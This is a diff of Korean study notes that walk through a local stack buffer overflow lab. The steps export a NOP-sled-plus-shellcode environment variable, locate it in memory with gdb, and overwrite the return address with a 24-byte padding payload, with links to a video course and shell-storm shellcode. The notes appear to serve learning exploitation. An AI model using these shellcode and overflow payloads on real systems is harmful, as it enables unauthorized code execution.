@@ -35,7 +35,9 @@ export SHELLCODE=`perl -e 'print "\x90" x 2000, "\x31\xc0\x48\xbb\xd1\x9d\x96\x9
 1) 셸코드 환경변수를 export 한다. (export 하면 메모리 상의 어딘가에 존재하고 있을 것이다.)
 
 2) overflow 프로그램을 gdb 로 실행한다. 이 때 목적은 export 한 셸코드의 대략적인 주소를 알아내는 것이다. 
+
 2-1) 메인함수에 브레이크 포인트를 건 다음 run 
+
 2-2) x/100a $rsp 명령 실행 (메모리의 값을 확인) 해서 SHELLCODE 에서 실제 셸코드가 있는 주소에서 조금 전의 주소를 알아낸다.
 
 3) 위의 주소를 토대로 공격 페이로드를 만들어서 overflow 프로그램에 전달한다. 
@@ -44,7 +46,10 @@ export SHELLCODE=`perl -e 'print "\x90" x 2000, "\x31\xc0\x48\xbb\xd1\x9d\x96\x9
 
 ./overflow `perl -e 'print "X" x 24, "\x88\xeb\x.."'` // 위어에 얻어낸 주소를 리틀엔디언 방식으로 표현
 
+X가 24번 반복되는 부분은 리턴주소까지의 24바이트를 덮어쓰기 위함이다.
+
 
 * Ref
 https://www.youtube.com/watch?v=eJWlg-VoCBg&list=PLRx0vPvlEmdAXwJnNtKIVeC27UmwljRYA&index=13
+
 [fn:1] http://shell-storm.org/shellcode/files/shellcode-806.php
